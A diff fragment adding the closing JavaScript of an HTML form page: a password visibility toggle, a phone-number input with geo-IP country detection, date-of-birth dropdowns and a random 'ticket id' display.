+                togglePwd.innerHTML = '<svg viewBox="0 0 24 24" width="20" height="20" fill="currentColor"><path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.16c0-1.66-1.34-3-3-3l-.17.01z"/></svg>';
+            } else {
+                togglePwd.innerHTML = '<svg viewBox="0 0 24 24" width="20" height="20" fill="currentColor"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>';
+            }
+        });
+
+        // Initialize phone input with flags
+        const phoneInputField = document.querySelector("#phone");
+        const phoneInput = window.intlTelInput(phoneInputField, {
+            initialCountry: "auto",
+            geoIpLookup: getIp,
+            utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js",
+        });
+
+        function getIp(callback) {
+            fetch('https://ipapi.co/json')
+                .then((res) => res.json())
+                .then((data) => callback(data.country_code))
+                .catch(() => callback("us"));
+        }
+
+        // Populate Date of Birth Selects
+        const monthSelect = document.getElementById('dob-month');
+        const daySelect = document.getElementById('dob-day');
+        const yearSelect = document.getElementById('dob-year');
+
+        const months = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"];
+        
+        months.forEach((month, index) => {
+            let option = document.createElement('option');
+            option.value = index + 1;
+            option.textContent = month;
+            monthSelect.appendChild(option);
+        });
+
+        for (let i = 1; i <= 31; i++) {
+            let option = document.createElement('option');
+            option.value = i;
+            option.textContent = i;
+            daySelect.appendChild(option);
+        }
+
+        const currentYear = new Date().getFullYear();
+        for (let i = currentYear; i >= 1905; i--) {
+            let option = document.createElement('option');
+            option.value = i;
+            option.textContent = i;
+            yearSelect.appendChild(option);
+        }
+
+        // Random ticket ID generator
+        function generateTicketId() {
+            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+            let id = '#';
+            for (let i = 0; i < 4; i++) {
+                id += chars.charAt(Math.floor(Math.random() * chars.length));
+            }
+            id += '-';
+            for (let i = 0; i < 4; i++) {
+                id += chars.charAt(Math.floor(Math.random() * chars.length));
+            }
+            id += '-';
+            for (let i = 0; i < 4; i++) {
+                id += chars.charAt(Math.floor(Math.random() * chars.length));
+            }
+            return id;
+        }
+
+        document.getElementById('ticketIdDisplay').textContent = 'Your ticket id: ' + generateTicketId();
+    </script>
+</body>
+</html>
